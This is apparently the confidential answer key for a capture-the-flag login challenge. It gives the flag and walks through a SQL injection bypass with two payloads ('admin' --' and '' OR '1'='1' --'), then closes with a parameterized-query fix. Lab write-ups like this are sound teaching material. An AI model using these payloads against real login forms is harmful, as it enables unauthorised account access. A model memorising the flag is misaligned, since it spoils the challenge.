# SOLUTION - CONFIDENTIAL - Login Bypass (web-01-login)

Flag: FLAG{sql_injection_bypasses_login}

## Walkthrough
The query is built by string formatting:
`SELECT username, role FROM users WHERE username = '<u>' AND password = '<p>'`

Username payload: `admin' --`
Resulting query: `SELECT username, role FROM users WHERE username = 'admin' --' AND password = '<anything>'`
Everything after `--` is a comment, so the password is never checked and the admin row is returned.

Another accepted payload: `' OR '1'='1' --` (the condition is always true and the first row is the admin user).

Defense: use parameterized queries: `db.execute("SELECT username, role FROM users WHERE username = ? AND password = ?", (username, password))`.
